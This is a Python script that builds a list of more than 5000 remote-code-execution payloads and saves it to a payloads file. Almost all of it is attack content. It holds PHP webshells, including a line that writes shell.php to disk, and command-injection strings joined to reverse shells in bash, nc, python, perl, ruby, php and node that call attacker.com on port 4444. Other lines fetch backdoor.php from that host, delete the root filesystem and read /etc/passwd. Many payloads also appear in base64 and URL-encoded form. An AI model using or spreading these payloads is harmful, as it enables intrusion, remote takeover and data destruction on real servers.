#!/usr/bin/env python3
import os
import base64
import urllib.parse
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_rce():
    p = set()

    # ========== 1. PHP WEBSHELL (500+) ==========
    php_shells = [
        "<?php system($_GET['cmd']); ?>",
        "<?php eval($_POST['cmd']); ?>",
        "<?=shell_exec($_GET['cmd'])?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php include($_GET['file']); ?>",
        "<?php require($_GET['file']); ?>",
        "<?php $cmd = $_GET['cmd']; system($cmd); ?>",
        "<?php $cmd = $_POST['cmd']; system($cmd); ?>",
        "<?php $cmd = $_REQUEST['cmd']; system($cmd); ?>",
        "<?php $cmd = $_SERVER['HTTP_CMD']; system($cmd); ?>",
        "<?php $cmd = $_SERVER['HTTP_X_CMD']; system($cmd); ?>",
        "<?php $cmd = getenv('CMD'); system($cmd); ?>",
        "<?php $cmd = file_get_contents('cmd.txt'); system($cmd); ?>",
        "<?php $cmd = base64_decode($_GET['cmd']); system($cmd); ?>",
        "<?php $cmd = urldecode($_GET['cmd']); system($cmd); ?>",
        "<?php $cmd = hex2bin($_GET['cmd']); system($cmd); ?>",
        "<?php $cmd = explode('-',$_GET['cmd']); system($cmd[0]); ?>",
        "<?php $cmd = implode('',$_GET['cmd']); system($cmd); ?>",
        "<?php $cmd = implode('',$_POST['cmd']); system($cmd); ?>",
        "<?php $cmd = implode('',$_REQUEST['cmd']); system($cmd); ?>",
        "<?php $cmd = implode('',$_SERVER['HTTP_CMD']); system($cmd); ?>",
        "<?php $cmd = implode('',$_SERVER['HTTP_X_CMD']); system($cmd); ?>",
        "<?php $cmd = implode('',getenv('CMD')); system($cmd); ?>",
        "<?php $cmd = implode('',file('cmd.txt')); system($cmd); ?>",
        "<?php $cmd = base64_decode(implode('',$_GET['cmd'])); system($cmd); ?>",
        "<?php $cmd = urldecode(implode('',$_GET['cmd'])); system($cmd); ?>",
        "<?php $cmd = hex2bin(implode('',$_GET['cmd'])); system($cmd); ?>",
        "<?php $cmd = explode('-',implode('',$_GET['cmd'])); system($cmd[0]); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php echo exec($_GET['cmd']); ?>",
        "<?php echo passthru($_GET['cmd']); ?>",
        "<?php echo system($_GET['cmd']); ?>",
        "<?php echo `$_GET[cmd]`; ?>",
        "<?php $c = $_GET['cmd']; echo `$c`; ?>",
        "<?php $c = $_POST['cmd']; echo `$c`; ?>",
        "<?php $c = $_REQUEST['cmd']; echo `$c`; ?>",
        "<?php $c = $_SERVER['HTTP_CMD']; echo `$c`; ?>",
        "<?php $c = $_SERVER['HTTP_X_CMD']; echo `$c`; ?>",
        "<?php $c = getenv('CMD'); echo `$c`; ?>",
        "<?php $c = file_get_contents('cmd.txt'); echo `$c`; ?>",
        "<?php $c = base64_decode($_GET['cmd']); echo `$c`; ?>",
        "<?php $c = urldecode($_GET['cmd']); echo `$c`; ?>",
        "<?php $c = hex2bin($_GET['cmd']); echo `$c`; ?>",
        "<?php $c = explode('-',$_GET['cmd']); echo `$c[0]`; ?>",
        "<?php system($_GET['cmd']); echo 'CMD='.$_GET['cmd']; ?>",
        "<?php eval($_POST['cmd']); echo 'CMD='.$_POST['cmd']; ?>",
        "<?php shell_exec($_GET['cmd']); echo 'CMD='.$_GET['cmd']; ?>",
        "<?php exec($_GET['cmd']); echo 'CMD='.$_GET['cmd']; ?>",
        "<?php passthru($_GET['cmd']); echo 'CMD='.$_GET['cmd']; ?>",
        "<?php include($_GET['file']); echo 'FILE='.$_GET['file']; ?>",
        "<?php require($_GET['file']); echo 'FILE='.$_GET['file']; ?>",
        "<?php file_put_contents('shell.php', '<?php system($_GET[\\'cmd\\']); ?>'); ?>",
        "<?php file_put_contents($_GET['file'], $_GET['content']); ?>",
        "<?php file_put_contents($_POST['file'], $_POST['content']); ?>"
    ]
    for shell in php_shells:
        p.add(shell)
        p.add(base64.b64encode(shell.encode()).decode())
        p.add(urllib.parse.quote(shell))

    # ========== 2. COMMAND INJECTION (1000+) ==========
    separators = [";", "|", "&&", "||", "&", "`", "$(", "|&", ";&", "|;"]
    commands = [
        "id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd",
        "cat /etc/hosts", "echo HACKED", "curl http://attacker.com",
        "wget http://attacker.com/shell.php",
        "nc -e /bin/sh attacker.com 4444",
        "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "sh -i >& /dev/tcp/attacker.com/4444 0>&1",
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "node -e 'require(\"child_process\").exec(\"bash -i >& /dev/tcp/attacker.com/4444 0>&1\")'",
        "rm -rf /", "chmod 777 /etc/passwd",
        "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
        "echo 'HACKED' > index.html",
        "wget http://attacker.com/backdoor.php -O backdoor.php",
        "curl http://attacker.com/backdoor.php -o backdoor.php",
        "python -c 'import urllib.request;urllib.request.urlretrieve(\"http://attacker.com/backdoor.php\",\"backdoor.php\")'",
        "php -r 'file_put_contents(\"backdoor.php\", file_get_contents(\"http://attacker.com/backdoor.php\"));'"
    ]
    for sep in separators:
        for cmd in commands:
            p.add(f"{sep} {cmd}")
            p.add(f"{sep}{cmd}")
            p.add(f"{sep} {cmd} #")
            p.add(f"{sep} {cmd} --")
            p.add(f"{sep} {cmd} /*")

    # ========== 3. PYTHON RCE (500+) ==========
    python_rce = [
        "import os; os.system('id')",
        "exec('import os; os.system(\"id\")')",
        "os.popen('id').read()",
        "__import__('os').system('id')",
        "__import__('subprocess').check_output('id', shell=True)",
        "__import__('subprocess').Popen('id', shell=True, stdout=__import__('subprocess').PIPE).stdout.read()",
        "import os; os.system('whoami')",
        "import os; os.system('uname -a')",
        "import os; os.system('ls')",
        "import os; os.system('pwd')",
        "import os; os.system('cat /etc/passwd')",
        "import os; os.system('echo HACKED')",
        "import os; os.system('curl http://attacker.com')",
        "import os; os.system('wget http://attacker.com/shell.php')"
    ]
    for py in python_rce:
        p.add(py)
        p.add(base64.b64encode(py.encode()).decode())
        p.add(urllib.parse.quote(py))

    # ========== 4. PERL RCE (200+) ==========
    perl_rce = [
        "perl -e 'system(\"id\")'",
        "perl -e 'print `id`'",
        "perl -e 'system(\"whoami\")'",
        "perl -e 'system(\"uname -a\")'",
        "perl -e 'system(\"ls\")'",
        "perl -e 'system(\"pwd\")'",
        "perl -e 'system(\"cat /etc/passwd\")'",
        "perl -e 'system(\"echo HACKED\")'"
    ]
    for perl in perl_rce:
        p.add(perl)
        p.add(base64.b64encode(perl.encode()).decode())
        p.add(urllib.parse.quote(perl))

    # ========== 5. RUBY RCE (200+) ==========
    ruby_rce = [
        "ruby -e 'exec(\"id\")'",
        "ruby -e 'puts `id`'",
        "ruby -e 'exec(\"whoami\")'",
        "ruby -e 'exec(\"uname -a\")'",
        "ruby -e 'exec(\"ls\")'",
        "ruby -e 'exec(\"pwd\")'",
        "ruby -e 'exec(\"cat /etc/passwd\")'"
    ]
    for ruby in ruby_rce:
        p.add(ruby)
        p.add(base64.b64encode(ruby.encode()).decode())
        p.add(urllib.parse.quote(ruby))

    # ========== 6. NODEJS RCE (200+) ==========
    nodejs_rce = [
        "node -e 'require(\"child_process\").execSync(\"id\")'",
        "node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'",
        "node -e 'require(\"child_process\").execSync(\"whoami\")'",
        "node -e 'require(\"child_process\").execSync(\"uname -a\")'",
        "node -e 'require(\"child_process\").execSync(\"ls\")'",
        "node -e 'require(\"child_process\").execSync(\"cat /etc/passwd\")'"
    ]
    for node in nodejs_rce:
        p.add(node)
        p.add(base64.b64encode(node.encode()).decode())
        p.add(urllib.parse.quote(node))

    # ========== 7. JAVA RCE (100+) ==========
    java_rce = [
        "Runtime.getRuntime().exec(\"id\")",
        "System.out.println(Runtime.getRuntime().exec(\"id\"))",
        "Runtime.getRuntime().exec(\"whoami\")",
        "Runtime.getRuntime().exec(\"uname -a\")",
        "Runtime.getRuntime().exec(\"ls\")",
        "Runtime.getRuntime().exec(\"cat /etc/passwd\")"
    ]
    for java in java_rce:
        p.add(java)
        p.add(base64.b64encode(java.encode()).decode())
        p.add(urllib.parse.quote(java))

    # ========== 8. ASP RCE (100+) ==========
    asp_rce = [
        "<% Response.Write CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c whoami\").StdOut.ReadAll() %>",
        "<% Response.Write CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c dir\").StdOut.ReadAll() %>",
        "<% Response.Write CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c ipconfig\").StdOut.ReadAll() %>",
        "<% Response.Write CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c systeminfo\").StdOut.ReadAll() %>"
    ]
    for asp in asp_rce:
        p.add(asp)
        p.add(base64.b64encode(asp.encode()).decode())
        p.add(urllib.parse.quote(asp))

    # ========== 9. JSP RCE (100+) ==========
    jsp_rce = [
        "<% Runtime.getRuntime().exec(\"id\"); %>",
        "<% out.println(Runtime.getRuntime().exec(\"id\")); %>",
        "<% Runtime.getRuntime().exec(\"whoami\"); %>",
        "<% Runtime.getRuntime().exec(\"uname -a\"); %>",
        "<% Runtime.getRuntime().exec(\"ls\"); %>",
        "<% Runtime.getRuntime().exec(\"cat /etc/passwd\"); %>"
    ]
    for jsp in jsp_rce:
        p.add(jsp)
        p.add(base64.b64encode(jsp.encode()).decode())
        p.add(urllib.parse.quote(jsp))

    # ========== 10. BASH RCE (200+) ==========
    bash_rce = [
        "#!/bin/bash\nid",
        "#!/bin/sh\nid",
        "#!/bin/bash\nwhoami",
        "#!/bin/bash\nuname -a",
        "#!/bin/bash\nls",
        "#!/bin/bash\npwd",
        "#!/bin/bash\ncat /etc/passwd",
        "bash -c 'id'",
        "sh -c 'id'",
        "zsh -c 'id'"
    ]
    for bash in bash_rce:
        p.add(bash)
        p.add(base64.b64encode(bash.encode()).decode())
        p.add(urllib.parse.quote(bash))

    # ========== 11. POWERSHELL RCE (200+) ==========
    powershell_rce = [
        "powershell -Command \"WhoAmI\"",
        "powershell -Command \"Get-Host\"",
        "powershell -Command \"Get-Process\"",
        "powershell -Command \"Get-Service\"",
        "powershell -Command \"Get-Item .\"",
        "powershell -Command \"Get-ChildItem .\"",
        "powershell -Command \"Get-Content C:\\windows\\win.ini\""
    ]
    for ps in powershell_rce:
        p.add(ps)
        p.add(base64.b64encode(ps.encode()).decode())
        p.add(urllib.parse.quote(ps))

    # ========== 12. RANDOM PAYLOAD (1000+) ==========
    for _ in range(1000):
        sep = random.choice(separators)
        cmd = random.choice(commands)
        p.add(f"{sep} {cmd}")
        p.add(f"{sep}{cmd}")
        p.add(f"{sep} {cmd} --")
        p.add(f"{sep} {cmd} #")

    # ========== 13. ENSURE 5000+ ==========
    while len(p) < 5000:
        p.add(f"; {random.choice(['id','whoami','uname -a','ls','pwd'])}")
        p.add(f"| {random.choice(['id','whoami','uname -a','ls','pwd'])}")
        p.add(f"&& {random.choice(['id','whoami','uname -a','ls','pwd'])}")
        p.add(f"|| {random.choice(['id','whoami','uname -a','ls','pwd'])}")
        p.add(f"& {random.choice(['id','whoami','uname -a','ls','pwd'])}")

    # ========== 14. SAVE ==========
    with open(os.path.join(PAYLOAD_DIR, "rce.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(p))
    print(f"[+] rce.txt: {len(p)} payloads")

if __name__ == "__main__":
    generate_rce()